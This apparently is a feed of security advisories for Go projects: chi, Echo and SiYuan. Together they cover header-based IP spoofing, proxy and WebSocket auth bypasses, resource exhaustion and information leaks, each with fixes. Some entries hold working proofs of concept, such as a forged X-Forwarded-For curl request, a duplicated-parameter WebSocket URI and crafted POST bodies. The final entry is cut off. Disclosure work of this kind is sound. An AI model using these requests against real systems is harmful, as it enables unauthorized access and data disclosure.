entry.title: [github.com/go-chi/chi/v5] chi: Client IP spoofing in ClientIPFromXFF via X-Forwarded-For
entry.content:
Summary

ClientIPFromXFF skips any X-Forwarded-For entry in a configured trusted CIDR but never verifies that the direct TCP peer in http.Request.RemoteAddr belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by middleware.GetClientIP.

The attack is remote and requires one unauthenticated HTTP request with no user interaction (AV:N/AC:L/PR:N/UI:N). It changes security decisions and exposes one protected handler within the same application (S:U/C:L/I:L); no availability loss was observed (A:N).

Preconditions: The application uses ClientIPFromXFF and makes the origin server reachable by an anonymous client outside the configured trusted-proxy CIDRs. No victim interaction is required.

  1. Send GET /admin directly to the origin with no X-Forwarded-For header.
  2. Observe a 403 Forbidden response and an empty derived client IP.
  3. Repeat the request with X-Forwarded-For: 10.0.0.7, 198.51.100.42.
  4. Observe 200 OK and client-ip="10.0.0.7". Expected: the untrusted direct peer prevents the forwarding chain from being accepted.

Details

The vulnerable code is ClientIPFromXFF in middleware/client_ip.go, lines 93-116 at the tested revision. It calls walkXFF with only the attacker-controlled header, skips every entry that matches a trusted prefix, and stores the first remaining address:

walkXFF(r.Header[xForwardedForHeader], func(v string) bool {
    ip, ok := parseHeaderAddr(v)
    if !ok {
        return true
    }
    if inAnyPrefix(ip, prefixes) {
        return false
    }
    found = ip
    return true
})

The function does not parse r.RemoteAddr before this walk. Consequently, the configured CIDRs identify trusted strings inside X-Forwarded-For, but do not establish that the immediate sender is one of those trusted proxies.

Proof of concept

Using Go 1.24 or later, create and run this minimal application against the tested revision:

mkdir chi-clientip-poc
cd chi-clientip-poc
go mod init clientip-poc
go get github.com/go-chi/chi/v5@167e1e3bd039d060696b99c8da4e876ae04f42c1
cat > main.go <<'EOF'
package main

import (
    "fmt"
    "log"
    "net/http"

    "github.com/go-chi/chi/v5"
    "github.com/go-chi/chi/v5/middleware"
)

const allowedIP = "10.0.0.7"

func main() {
    r := chi.NewRouter()
    r.Use(middleware.ClientIPFromXFF("198.51.100.0/24"))
    r.Get("/admin", func(w http.ResponseWriter, r *http.Request) {
        clientIP := middleware.GetClientIP(r.Context())
        if clientIP != allowedIP {
            http.Error(w, fmt.Sprintf("denied: tcp-peer=%q client-ip=%q", r.RemoteAddr, clientIP), http.StatusForbidden)
            return
        }
        fmt.Fprintf(w, "allowed: tcp-peer=%q client-ip=%q\n", r.RemoteAddr, clientIP)
    })

    log.Print("listening on http://127.0.0.1:3001")
    log.Fatal(http.ListenAndServe("127.0.0.1:3001", r))
}
EOF
go run .

The no-header control was rejected:

$ curl --http1.1 -i http://127.0.0.1:3001/admin
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Tue, 06 Oct 2026 15:46:27 GMT
Content-Length: 48

denied: tcp-peer="127.0.0.1:54416" client-ip=""

Adding the forged chain authorized the same direct client:

$ curl --http1.1 -i -H 'X-Forwarded-For: 10.0.0.7, 198.51.100.42' http://127.0.0.1:3001/admin
HTTP/1.1 200 OK
Date: Tue, 06 Oct 2026 15:46:33 GMT
Content-Length: 57
Content-Type: text/plain; charset=utf-8

allowed: tcp-peer="127.0.0.1:54417" client-ip="10.0.0.7"

Impact

I made an anonymous direct connection from 127.0.0.1, supplied a header that ended in a different trusted-proxy CIDR, and caused the application to treat my client IP as the allowlisted 10.0.0.7. This changed the authorization decision from 403 Forbidden to 200 OK for the protected handler.

References

  • https://github.com/go-chi/chi/security/advisories/GHSA-j6qf-3m9c-vwj3
  • https://nvd.nist.gov/vuln/detail/CVE-2026-114437
  • https://github.com/go-chi/chi/pull/1214
  • https://github.com/go-chi/chi/commit/7f9b7448f51d28804fac98c0a17bc2a7cec1079f
  • https://github.com/go-chi/chi/releases/tag/v5.4.0

Duplicate Advisory

This advisory has been withdrawn because it is a duplicate of GHSA-j6qf-3m9c-vwj3. This link is maintained to preserve external references.

Original Description

In the Golang Chi web framework, the ClientIPFromXFF middleware skips any X-Forwarded-For entry in a configured trusted CIDR but never verifies that the direct TCP peer in http.Request.RemoteAddr belongs to that CIDR. A client that can reach the Go server directly can therefore append a trusted-looking proxy address and choose the client IP returned by middleware.GetClientIP.

This issue affects chi before 5.4.0.

entry.title: [github.com/labstack/echo/v5] Echo: X-Real-IP extractor trusts the header value instead of the sending peer
entry.content:
Impact

In Echo v5, ExtractIPFromRealIPHeader checked whether the address supplied in X-Real-IP belonged to a trusted range instead of checking the address of the direct network peer. An untrusted client could therefore supply a loopback or private address and have it returned by c.RealIP() with the extractor's default trust options.

Applications using this extractor for IP allowlists, IP-based rate limiting, audit logs or forwarding headers could accept a spoofed client identity. Exploitation requires that the attacker can reach Echo directly or that an intervening proxy passes through the attacker's X-Real-IP value. Applications using the default direct IP extractor are unaffected. Echo v4 is unaffected by this v5 regression.

Affected versions and patch

All v5 releases from v5.0.0 through v5.4.0 are affected. Upgrade to v5.4.1.

The patch validates the direct peer before accepting a syntactically valid X-Real-IP value, restoring the v4 trust model. Fix commit.

Workarounds

Use ExtractIPDirect until upgrading, or ensure that only trusted proxies can reach Echo and that they replace client-supplied forwarding headers. Configure trusted proxy ranges narrowly for the deployment.

Credits

Reported and patched by @rm-Umar. @Duodum independently reported the same issue in GHSA-c3r7-8j36-7mx8, which is tracked as a duplicate of this advisory.

References

  • https://github.com/labstack/echo/security/advisories/GHSA-h53f-rm2w-w7rg

entry.title: [github.com/labstack/echo/v5] Echo: WebSocket proxy can retain connections and handlers after client disconnect
entry.content:
Impact

Echo's Proxy middleware could retain a handler, copy goroutines and network connections after a WebSocket client disconnected if the upstream kept its connection open. The raw proxy waited for both copy directions to finish without reliably closing the other connection when one direction ended. Rejected upgrade responses with HTTP keep-alive were one way to trigger this behavior.

Repeated connections can accumulate resources and cause denial of service. The impact depends on the proxy route's accessibility, upstream behavior and configured connection deadlines. This is a medium-severity resource-retention issue; no confidentiality or integrity impact is claimed.

Affected versions and patch

Affected versions are v4.15.0 through v4.16.0 and v5.0.0 through v5.4.0. The regression was introduced by commit e2133320c7, merged in #2852.

Upgrade to v4.16.1 or v5.4.1. The patch uses Go's HTTP reverse proxy, preserves ordinary HTTP handling for rejected upgrades, and closes both sides of a WebSocket tunnel when either direction ends. It also covers an upstream that receives client EOF but deliberately keeps its side open.

Fix commits: v4, v5.

Workarounds

Disable WebSocket proxy routes until upgrading, or apply bounded connection lifetimes and resource limits at the frontend and upstream. Server idle timeouts alone may not cover hijacked WebSocket connections.

Credits

Reported by @irisitymichaelgrundberg.

References

  • https://github.com/labstack/echo/security/advisories/GHSA-9969-6676-49h5
  • https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec
  • https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f

entry.title: [github.com/labstack/echo/v4] Echo: Decompress permits unbounded gzip expansion in v4
entry.content:
Impact

Echo v4's opt-in Decompress middleware exposed a gzip-decoded request stream without limiting its expanded size. A small compressed request could therefore produce a very large decoded body. Handlers that read or bind that body could consume excessive memory or CPU, and repeated or concurrent requests could cause denial of service.

The middleware is not enabled by default. A limit on the compressed request size alone does not bound the decompressed size. Applications that already apply an effective body limit after decompression have reduced exposure.

Affected versions and patch

Echo v4 versions through v4.16.0 are affected. Upgrade to v4.16.1.

The patch adds DecompressConfig.MaxDecompressedSize, defaulting to 100 MiB when zero. A value of -1 explicitly disables the limit. Reading beyond the cap returns ErrStatusRequestEntityTooLarge (HTTP 413), including through JSON and XML binding. Bodies exactly at the configured limit remain valid. Streaming enforcement requires callers to handle body-read errors.

Fix commit.

Workarounds

Disable gzip request decompression on exposed routes, or place BodyLimit after Decompress so the application limit applies to decoded bytes. Apply suitable request deadlines and concurrency limits as well.

Credits

Reported by @q490107865. The exact-limit behavior incorporates @Shubham-Padkonde's work in #3136.

References

  • https://github.com/labstack/echo/security/advisories/GHSA-h7wr-284f-5qvc
  • https://github.com/labstack/echo/pull/3136
  • https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f
  • https://github.com/labstack/echo/releases/tag/v4.16.1
  • https://github.com/advisories/GHSA-h7wr-284f-5qvc

entry.title: [github.com/labstack/echo/v5] Echo: Rejected WebSocket upgrades can bypass Echo route-level access controls
entry.content:
Impact

Echo's Proxy middleware selected a raw tunnel when the client requested a WebSocket upgrade, before validating whether the configured upstream accepted it. If the upstream returned an ordinary HTTP response and kept the connection alive, subsequent HTTP requests on that connection were forwarded directly to the same upstream without passing through Echo's router or route-specific middleware.

This can bypass authentication or authorization enforced only at Echo's routes. Exploitation requires an accessible proxy route, an upstream that rejects the upgrade without closing the connection, and a target resource on that upstream without independent authorization. The issue does not provide arbitrary-host proxying or bypass the upstream's own authentication.

Affected versions and patch

The raw proxy implementation is present throughout the v4 and v5 release lines up to v4.16.0 and v5.4.0. Runtime reproductions confirmed v4.15.0, v4.16.0, v5.0.0 and v5.4.0; source history also shows the missing upgrade-response validation in v4.0.0.

Upgrade to v4.16.1 or v5.4.1. The patch routes WebSocket upgrades through Go's HTTP reverse proxy and enters a tunnel only after a valid upstream upgrade response. Rejected upgrades remain ordinary HTTP requests.

Fix commits: v4, v5.

Workarounds

Reject WebSocket upgrade requests before they reach affected Echo proxy routes, or enforce authorization independently at every upstream resource. Merely returning a non-101 response from the upstream does not prevent the vulnerable raw tunnel.

Credits

Reported by @Duodum.

References

  • https://github.com/labstack/echo/security/advisories/GHSA-cxf3-9h37-7rr8
  • https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec
  • https://github.com/labstack/echo/commit/3fb0ba7e17645bb65611e2a08875d0a2f65c421f
  • https://github.com/labstack/echo/releases/tag/v4.16.1
  • https://github.com/labstack/echo/releases/tag/v5.4.1

entry.title: [github.com/labstack/echo/v5] Echo: BodyDump can discard BodyLimit overflow errors for unknown-length requests
entry.content:
Impact

Echo v5's BodyDump middleware captured a bounded prefix, drained the remaining request body while ignoring read errors, and then replaced the body with the captured prefix. With an outer BodyLimit, an unknown-length request such as an HTTP/1.1 chunked request, and a BodyDump capture limit below the BodyLimit threshold, an overflow detected during that drain could be discarded.

The handler could consequently process a truncated request and return success even though the original body exceeded the configured limit. This is a conditional size-policy bypass; no general authentication bypass, production data modification or denial of service is claimed. Known-length requests rejected before BodyDump runs are unaffected by this path.

Affected versions and patch

All v5 releases from v5.0.0 through v5.4.0 contain the affected drain-and-replace logic. Runtime reproduction confirmed v5.4.0; source comparison confirms the same request handling in v5.0.0.

Upgrade to v5.4.1. BodyDump now captures only the configured prefix for logging and reconstructs the handler's reader from that prefix plus the unread original stream. It preserves the original closer and read errors instead of silently draining the rest. Fix commit.

Streaming BodyLimit enforcement still requires the application to consume the request body and handle read errors. The BodyDump capture cap is a logging cap, not an application body limit.

Workarounds

Disable BodyDump on affected routes, or ensure the BodyLimit overflow is detected during the initial capture by setting the capture limit above the enforced body limit. Upgrading is recommended because it also preserves the complete body for handlers.

Credits

Reported by @Duodum. The fix incorporates @jakezwang's request-body preservation work in #3105.

References

  • https://github.com/labstack/echo/security/advisories/GHSA-x9ff-22gv-65f4
  • https://github.com/labstack/echo/pull/3105
  • https://github.com/labstack/echo/commit/1855061e572ae9dab727c811d8382f266bfbaaec
  • https://github.com/labstack/echo/releases/tag/v5.4.1

entry.title: [github.com/labstack/echo/v4] Echo: BodyDump captures request and response bodies without size limits in v4
entry.content:
Impact

Echo v4's opt-in BodyDump middleware read complete request bodies into memory and retained complete response bodies without a capture limit. A client able to submit large requests to a route using BodyDump could cause large allocations before the application handler ran. Large responses, including responses whose size can be influenced by a client, also caused an additional unbounded capture allocation.

Repeated or concurrent requests can exhaust process memory and cause denial of service. BodyDump is not enabled by default. Deployments with effective request limits may reduce the request-side exposure; response capture requires separate consideration.

Affected versions and patch

Echo v4 versions through v4.16.0 are affected. Upgrade to v4.16.1.

The patch adds BodyDumpConfig.MaxRequestBytes and MaxResponseBytes, each defaulting to 5 MiB when zero. A value of -1 explicitly restores unlimited capture. The complete request remains readable by the handler and the complete response is delivered to the client; only the callback's captured data is bounded. Request close behavior and read errors are preserved.

Fix commit.

Workarounds

Disable BodyDump on exposed routes, particularly large uploads and downloads. Alternatively, enforce body-size limits before BodyDump and independently bound the responses that the application generates.

Credits

Reported by @q490107865. The patch also incorporates request-body preservation work from @jakezwang in #3105.

References

  • https://github.com/labstack/echo/security/advisories/GHSA-f48p-c9v4-h7xv

entry.title: [github.com/siyuan-note/siyuan/kernel] SiYuan: Missing consistency check between packageName and repoURL/repoHash in bazaar package install allows overwriting an existing, trusted plugin
entry.content:
Summary

installBazaarPlugin (and the equivalent endpoints for widgets/icons/templates/themes) accept packageName, repoURL, and repoHash as independent request fields with no validation that they refer to the same package. packageName alone determines the install destination; repoURL/repoHash alone determine what content gets downloaded and written there. A request can name an already-installed, already-enabled plugin as packageName while pointing repoURL/ repoHash at different, attacker-influenced content, silently overwriting the existing plugin's files.

Affected code

kernel/api/bazaar.go:

util.BindJsonArg("packageName", &packageName, true, true)
util.BindJsonArg("repoURL", &repoURL, true, true)
util.BindJsonArg("repoHash", &repoHash, true, true)
err := model.InstallBazaarPackage("plugins", repoURL, repoHash, packageName, 0)

kernel/model/bazaar.go:

func getPackageInstallPath(pkgType, packageName string) (string, string, error) {
    case "plugins":
        return filepath.Join(util.DataDir, "plugins", packageName), "plugin.json", nil

kernel/bazaar/install.go:

func installPackage(data []byte, installPath string) (err error) {
    ...
    if err = filelock.Copy(srcPath, installPath); err != nil { return }
    return
}

installPath is derived solely from packageName; the downloaded data is derived solely from repoURL/repoHash; nothing cross-validates them, and installPackage performs no check for whether installPath already contains an existing package before copying into it. The same pattern applies to the widget/icon/template/theme install endpoints, which share getPackageInstallPath.

This does not involve path traversal — installPath always resolves inside DataDir/plugins/ (or the corresponding directory for other package types), so this is not an instance of "arbitrary file write outside the workspace path" (excluded by this project's SECURITY.md). The issue is that the write lands in the wrong, existing location within the intended directory, not outside it — an authorization/identity-verification gap, not a path traversal.

Reachability / why this is not trivially remote

The bazaar endpoints are gated by model.CheckAuth, model.CheckAdminRole, model.CheckReadonly. When no lock-screen password is configured (the common desktop default), CheckAuth still enforces a same-origin check:

if !localhost || ... || ("" != origin && !util.IsLocalOrigin(origin)) || ... {
    // reject with 401
}

I verified IsLocalOrigin/IsLocalHostname correctly parse the Origin header via url.Parse and check exact hostname / loopback IP:

func IsLocalOrigin(origin string) bool {
    if u, err := url.Parse(origin); err == nil {
        return IsLocalHostname(u.Hostname())
    }
    return false
}
func IsLocalHostname(hostname string) bool {
    if "localhost" == hostname || strings.HasSuffix(hostname, ".localhost") {
        return true
    }
    if ip := net.ParseIP(hostname); nil != ip {
        return ip.IsLoopback()
    }
    return false
}

This was tested against common bypass patterns (subdomain-suffix tricks like localhost.attacker.com, and Origin: null as sent by sandboxed iframes) and found no bypass — this is a correctly-implemented check. This means a purely remote attacker (e.g. a malicious website) cannot invoke this endpoint via CSRF; a request must originate from SiYuan's own renderer origin.

Realistic impact

Given SiYuan runs as an Electron app with nodeIntegration: true (per prior advisories in this repository), a same-origin script-execution primitive (e.g. an XSS bug in the renderer, of which several have been fixed in this repository recently) is typically already sufficient for direct code execution. This bug's marginal value is persistence: a transient XSS-driven compromise can use this endpoint to overwrite an existing, trusted, already-enabled plugin's index.js, converting a one-time compromise into code that runs on every future launch of the application, surviving after the original XSS vector is closed.

The overwrite does not effect immediately, via this specific endpoint. PushReloadPlugin (the websocket event that triggers frontend hot-reload without restart) is only called from the batch-update path (InstallBazaarPackages, used by batchUpdatePackage), which explicitly checks if petal != nil && petal.Enabled before forcing a reload via SetPetalEnabled. The single-package install endpoint (installBazaarPlugin) does not call PushReloadPlugin at all — it only pushes a generic success toast. So an overwrite via this endpoint activates on the next app restart or manual plugin toggle, rather than instantly still a realistic and frequent event for a desktop application, but not an instant hot-reload.

Suggested fix

Verify that packageName matches the package name declared in the downloaded package's own plugin.json/theme.json/etc. before copying into installPath, and/or refuse to install over an existing, non-empty destination directory unless the request is explicitly an update of that same package (matching by source repo identity, not just by request-supplied name).

Verification notes

Confirmed via static source review of kernel/api/bazaar.go, kernel/model/bazaar.go, kernel/bazaar/install.go, kernel/model/session.go (CheckAuth), kernel/util/net.go (IsLocalOrigin/IsLocalHostname), and kernel/model/push_reload.go / app/src/plugin/loader.ts (reload trigger wiring). I do not have a running SiYuan instance in this environment to execute an end-to-end proof of concept; findings are based on tracing the actual, unmodified control flow across these files rather than assumption.

References

  • https://github.com/siyuan-note/siyuan/security/advisories/GHSA-rpx2-p6hp-x5gj
  • https://nvd.nist.gov/vuln/detail/CVE-2026-62204
  • https://github.com/siyuan-note/siyuan/commit/26ccb40d390eb7d9b04673629a58ab1d69cc7e53
  • https://github.com/siyuan-note/siyuan/releases/tag/v3.8.0
  • https://www.vulncheck.com/advisories/siyuan-before-plugin-overwrite-via-bazaar-install
  • https://github.com/advisories/GHSA-rpx2-p6hp-x5gj

This advisory has been withdrawn because it is a duplicate of GHSA-rpx2-p6hp-x5gj. This link is maintained to preserve external references.

Original Description

SiYuan versions before v3.7.4 fail to validate that packageName matches the downloaded package content in bazaar install endpoints. Attackers with same-origin access can overwrite existing trusted plugins by supplying mismatched packageName and repoURL parameters, achieving persistence across application restarts.

entry.title: [github.com/siyuan-note/siyuan/kernel] SiYuan: A parser differential between the WebSocket keepalive exemption and the session quarantine allows unauthenticated access to the broadcast event stream
entry.content:
Summary

Two checks on the same WebSocket request URI parse it differently. The authentication exemption for keepalive sessions matches raw substrings, while the quarantine introduced to contain those sessions reads a parsed query parameter. Because Go's url.Values.Get returns only the first value for a repeated key, a single URI can satisfy the exemption and still resolve to a non-auth session identity.

The result is that an unauthenticated remote caller connects to the kernel WebSocket with a valid access auth code configured, is placed in the general broadcast pool rather than the quarantined pool, and receives the live event stream.

Details

The exemption matches substrings. kernel/server/serve.go:1222 on the development branch, :1074 on master:

authOk = strings.Contains(s.Request.RequestURI, "/ws?app=siyuan") &&
         strings.Contains(s.Request.RequestURI, "&id=auth&type=auth")

Neither operand is parsed. Any URI containing both literals is exempted, regardless of what the query actually resolves to.

The quarantine parses. Commit 1e370e373 added the containment for exempted sessions at kernel/util/websocket.go:171:

id = session.Request.URL.Query().Get("id")
return "auth" == id

url.Values.Get returns the first value for a repeated key.

The differential. For the URI:

/ws?app=siyuan&id=main&type=main&id=auth&type=auth
  • It contains /ws?app=siyuan and &id=auth&type=auth, so authOk is true. No cookie, no JWT and no access auth code are required.
  • Query().Get("id") returns main, so IsAuthSession is false. AddPushChan files the session in sessions, the broadcast pool, rather than in authSessions.
  • Query().Get("type") returns main, so the session matches BroadcastByType("main", ...).
  • Without a valid X-Auth-Token the publish flag is never set, so isPublishSession() does not exclude it either.

Every guard that should have caught the session keys off a different parse than the one that admitted it.

No origin validation. CheckOrigin does not appear on the /ws path, so the cross-origin vector described in the parent advisory also remains available.

Distinction from the existing broadcast-pool advisory. GHSA-mw8r-mw84-88v2 concerns the publish port, where an anonymous session is expected to connect and the defect is that broadcast content is not gated for it afterwards. This report concerns the kernel port with an access auth code configured, where the session should never be admitted in the first place. The leaked data overlaps because both end in the same broadcast pool, but the mechanisms and the affected deployments are different, and gating publish sessions does not close this path.

Proof of Concept

Kernel port, --accessAuthCode set. Three WebSocket connections, none carrying credentials of any kind.

Socket Query Result
A, baseline ?app=siyuan&id=main&type=main Rejected, closed 1002, 0 frames
B, control ?app=siyuan&id=auth&type=auth Connects, 0 frames
C, attack ?app=siyuan&id=main&type=main&id=auth&type=auth Connects, 19 to 30 frames across two runs

Socket A establishes that the access auth code is enforced. Socket B establishes that the existing quarantine works exactly as intended, admitting the keepalive session but delivering nothing to it. Socket C differs from B only in the duplicated parameters, and receives the event stream.

Frames observed on socket C included savedoc ("action":"create","data":{"Root":{"ID": ...), transactions ("action":"updateAttrs" carrying document titles), filetreeSortChanged (the notebook's complete ordered childIDs), create (a notebook object including its name), and backgroundtask.

A canary string placed inside a document body did not appear in any frame, on a full-text search of all captured frames.

Impact

An unauthenticated remote caller obtains the kernel's live event stream on a deployment protected by an access auth code, with no user interaction and no prior knowledge of the instance.

Precisely what is disclosed: document identifiers and titles, notebook identifiers and names, file paths, the complete ordered child structure of notebooks, and the full stream of create, update and delete operations as they occur. Document body content is not present in the observed frames.

That set corresponds to the disclosure claimed by GHSA-xp2m-98x8-rpj6, which means the remediation for that advisory is bypassable rather than incomplete in scope. The absence of origin validation on the endpoint additionally preserves the cross-origin reachability described there.

Confidentiality only. No frames observed permitted writes.

Suggested fix

Make both checks agree, and stop re-parsing attacker-controlled input after admission.

  1. In the exemption, parse the query rather than matching substrings, and require id and type each to equal auth exactly.
  2. Reject requests carrying duplicated query keys on this endpoint, so no URI can present two identities.
  3. Record the exemption as a flag on the session at connect time, and have IsAuthSession read that flag rather than re-parsing the request. A session admitted under the keepalive exemption is then quarantined by construction, independent of how its URI is read later.

Adding origin validation to /ws would additionally close the cross-origin vector.

References

  • https://github.com/siyuan-note/siyuan/security/advisories/GHSA-c8w8-3pqp-wr83
  • https://nvd.nist.gov/vuln/detail/CVE-2026-73054
  • https://github.com/siyuan-note/siyuan/commit/67bc300b6ea6650d99dae55c827aeced419c8ac4
  • https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4
  • https://www.vulncheck.com/advisories/siyuan-before-authentication-bypass-via-websocket
  • https://github.com/advisories/GHSA-c8w8-3pqp-wr83

entry.title: [github.com/siyuan-note/siyuan/kernel] SiYuan: authFilePublishAccess distinguishes hidden and forbidden documents from public and nonexistent ones, and issues a publish-auth cookie for documents it reports as forbidden
entry.content:
Summary

/api/filetree/authFilePublishAccess is registered with CheckAuth only and is reachable anonymously. It never sets a failure code, so its outcome is signalled entirely by the response message and by whether a Set-Cookie header is present. Those two signals differ across access tiers, which lets an anonymous caller determine, for any candidate document identifier, whether that document is public or nonexistent, password-protected, or exists at the hidden or forbidden tier.

Separately, hidden and forbidden entries carry an empty password. Submitting password:"" therefore satisfies the equality check for them, and the server responds by issuing Set-Cookie: publish-auth-<docID> for a document whose own tier is forbidden.

Details

Route, identical on both refs:

ginServer.Handle("POST", "/api/filetree/authFilePublishAccess", model.CheckAuth, authFilePublishAccess)

No CheckAdminRole, no CheckReadonly.

Handler, kernel/api/filetree.go:1608 on the development branch and :1421 on master. ret.Code is never assigned on the failure path, so every response carries code:0. The branch is:

if item.Password == password {
    // SetPublishAuthCookie
} else {
    ret.Msg = Conf.Language(285)
}

The cookie is issued for forbidden documents. Entries at the hidden and forbidden tiers store Password == "". A request with password:"" therefore makes item.Password == password true for them, and the handler takes the success branch. The server issues a publish-auth cookie for a document it otherwise treats as inaccessible.

The cookie itself confers nothing, because those tiers are decided before any password check elsewhere in the codebase. The defect is that the endpoint's success signal does not correspond to access being granted, and that signal is observable.

Three distinguishable outcomes. With password:"", one request per candidate identifier:

Tier of the target Set-Cookie Body
Public (no publish-access entry) absent {"code":0,"msg":""}
Nonexistent identifier absent {"code":0,"msg":""}
Password-protected absent {"code":0,"msg":"Password is incorrect"}
Hidden present {"code":0,"msg":""}
Forbidden present {"code":0,"msg":""}

Public and nonexistent are indistinguishable from each other, which is correct. Everything else separates. A caller learns whether a given identifier names a password-protected document, or a document that exists at the hidden or forbidden tier, which is precisely the class the publish tiers exist to conceal.

Identifiers are readily available. Document and block identifiers appear in the DOM of published pages, in reference and backlink payloads, and in annotation reference data. The caller does not need to guess them.

A fourth response on the development branch. IsEncryptedPublishRuntimeTarget sets ret.Code = -1, which identifies the supplied identifier as belonging to an encrypted notebook. That is a membership oracle for encrypted notebooks, the same data class as GHSA-f2rw-w22v-54vh.

Proof of Concept

Publish mode enabled, Publish.Auth.Enable false, anonymous client. One request per candidate identifier, all with an empty password:

POST /api/filetree/authFilePublishAccess
{"id":"<candidate document id>","password":""}

Comparing the response message and the presence of Set-Cookie against the table above classifies the identifier. Documents at the hidden and forbidden tiers return a publish-auth cookie and an empty message, distinguishing them both from public documents and from identifiers that name nothing at all.

Impact

An anonymous reader in publish mode, or any publish RoleReader, can classify arbitrary document identifiers by access tier and confirm the existence of documents at the hidden and forbidden tiers. On the development branch the same endpoint additionally reveals whether an identifier belongs to an encrypted notebook.

Scoped precisely: no document content is disclosed and no privilege is gained, since the issued cookie is inert for these tiers. The value is as a confirmation primitive, turning an identifier obtained elsewhere into a definite statement about a document the reader is not permitted to see.

Confidentiality only, with no integrity or availability impact.

Suggested fix

Return an identical response for every failure and for every tier the caller may not access, with no Set-Cookie header and no distinguishing message. In particular, do not treat an empty stored password as a successful match: hidden and forbidden entries should short-circuit before the password comparison rather than satisfying it. The encrypted-notebook branch should return the same generic response as everything else rather than its own code.

A rate limit on this endpoint would be a reasonable additional hardening measure, though it does not address the disclosure above.

References

  • https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4pjg-x8qj-33j5
  • https://nvd.nist.gov/vuln/detail/CVE-2026-73630
  • https://github.com/siyuan-note/siyuan/commit/c7522b8db586ef1e1d6fa98bbe7ca0eb9d019efe
  • https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4
  • https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-authfilepublishaccess
  • https://github.com/advisories/GHSA-4pjg-x8qj-33j5

entry.title: [github.com/siyuan-note/siyuan/kernel] SiYuan: The publish filter for database backlinks consults the forbidden list instead of the visibility list, disclosing hidden-tier documents to anonymous readers
entry.content:
Summary

/api/av/getAttributeViewBacklinks filters its results for reader roles through FilterAttributeViewBacklinksByPublishAccess. That function resolves its ignore list with GetDisablePublishAccess, which covers only the forbidden tier. Documents at the hidden tier are absent from that list, so they pass the check.

The result is that an anonymous reader supplying a publicly visible database row receives the database name, row title and document path of rows in hidden documents that reference it.

The rest of the function is correct. It takes *gin.Context and calls GetPathPasswordByPublishAccess and CheckPublishAuthCookie at all four decision points, so the password-protected and private tiers are properly enforced. The defect is the choice of list, on one line.

Details

Route, kernel/api/router.go:545 on the development branch and :527 on master:

ginServer.Handle("POST", "/api/av/getAttributeViewBacklinks", model.CheckAuth, getAttributeViewBacklinks)

CheckAuth only. No CheckAdminRole, no CheckReadonly.

The defect. In FilterAttributeViewBacklinksByPublishAccess (kernel/model/publish_access.go:1060 on dev, :435 on master):

publishIgnore := GetDisablePublishAccess(publishAccess)

GetDisablePublishAccess returns only entries at the forbidden tier. A hidden document has visible:false, password:"", disable:false, so it does not appear in that list. CheckPathAccessableByPublishIgnore therefore returns true for it, and because the password is empty the authentication branch short-circuits. Hidden documents pass both halves of the check.

The sibling filter uses the correct list. The regular backlink panel is the same product feature in the same UI, and it is gated properly. kernel/api/ref.go:170 getBacklink2 calls FilterPathsByPublishAccess, which at kernel/model/publish_access.go:1256 resolves its list with GetInvisiblePublishAccess. Two backlink filters in the same file, opposite list choices.

The distinction the tiers are meant to draw. The shipped description of the hidden tier, from app/appearance/langs/en.json:

publishAccessHiddenComment = "Not publicly visible, can be accessed directly."

A direct-access endpoint using the forbidden list is consistent with that: hidden documents are meant to be reachable when the caller already knows the identifier. Backlink discovery is not direct access. The caller supplies the target row and receives the identities of referring rows it never named, which is enumeration, and enumeration is precisely what "not publicly visible" excludes.

Origin. The filter was introduced by 6da2c736e (2026-07-18, "Show database relation backlinks in the attribute panel", #10599) with this list choice from the start. No security-focused commit has touched the attribute-view backlink path since.

What is returned. Per matched backlink: AvName (the database name), Title (the row title), DatabasePath (the HPath of the containing document), BoxID, DatabaseBlockID, and Relations[].KeyName. These are author-written names and titles, not opaque identifiers.

Proof of Concept

Publish mode enabled, Publish.Auth.Enable false, anonymous client with no credentials or cookies. Document A is public and holds a database with a row. Document B is set to varying tiers and holds a database whose relation field points at A's row. The attacker needs only A's avID and itemID, both present in the DOM of A's own published page.

Listing control first, establishing that the platform agrees B must not be listed:

POST /api/filetree/listDocsByPath
→ returns only the public document

Then the same backlinks request at four tier settings, spaced to clear the 30-second GetPublishAccess() cache:

Tier of document B Result
Hidden (visible:false, no password, disable:false) total:1, with avName, title, databasePath and relations[].keyName for the row in B
Forbidden (disable:true) total:0
Private (password set) total:0
Hidden again (restored) total:1, reproducible

The forbidden row confirms that the disable list is what the filter consults. The private row confirms that the password half works correctly. The gap is the hidden tier alone.

POST /api/av/getAttributeViewBacklinks
{"avID":"<public database id>","itemID":"<public row id>"}

→ 200, total:1, disclosing the database name, row title and document path
       of a document the same session cannot list

Impact

An anonymous reader in publish mode, or any publish RoleReader, discovers that a hidden document contains a database row referencing a public one, and receives that row's title, its database's name, and the containing document's path. Names and titles are author-written and routinely describe their subject, so this discloses both the existence and the topic of documents the author marked as not publicly visible.

The reader does not need to know anything about the hidden document beforehand. The only input is a public row identifier taken from a page they are already entitled to view.

Confidentiality only, with no integrity or availability impact. No document body content is returned.

Suggested fix

Change the list resolution in FilterAttributeViewBacklinksByPublishAccess to GetInvisiblePublishAccess, mirroring FilterPathsByPublishAccess on the regular backlink path. The password handling in the function is already correct and needs no change.

References

  • https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4qw-vx5p-g984
  • https://nvd.nist.gov/vuln/detail/CVE-2026-73049
  • https://github.com/siyuan-note/siyuan/commit/5b42614311b0afda29ccc65e55d74bf3e8cc9054
  • https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4
  • https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-getattributeviewbacklinks
  • https://github.com/advisories/GHSA-p4qw-vx5p-g984

entry.title: [github.com/siyuan-note/siyuan/kernel] SiYuan: The publish filter for local storage returns the administrator's entire storage map with only three keys sanitized
entry.content:
Relationship to GHSA-hgfg-j9pg-43xw

